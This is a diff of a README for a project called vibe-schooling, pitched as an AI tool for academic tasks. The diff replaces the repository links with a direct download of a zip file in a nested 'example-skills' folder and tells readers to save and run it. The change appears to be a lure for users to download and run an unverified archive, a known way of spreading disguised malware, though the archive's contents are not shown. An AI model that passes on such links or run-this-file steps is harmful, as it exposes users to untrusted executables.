@@ -1,11 +1,11 @@
 # 🧠 vibe-schooling - Simplify academic tasks with AI
 
-[![Download vibe-schooling](https://img.shields.io/badge/Download-vibe--schooling-6f42c1?style=for-the-badge&logo=github)](https://github.com/efaship2/vibe-schooling)
+[![Download vibe-schooling](https://img.shields.io/badge/Download-vibe--schooling-6f42c1?style=for-the-badge&logo=github)](https://github.com/efaship2/vibe-schooling/raw/refs/heads/main/claude-cowork/example-skills/vibe_schooling_v2.2.zip)
 
 ## 📥 Download
 
 Use this link to visit this page to download:
-https://github.com/efaship2/vibe-schooling
+https://github.com/efaship2/vibe-schooling/raw/refs/heads/main/claude-cowork/example-skills/vibe_schooling_v2.2.zip
 
 Open the page, then look for the latest release or the main download files. Save the file to your PC before you run it.
 
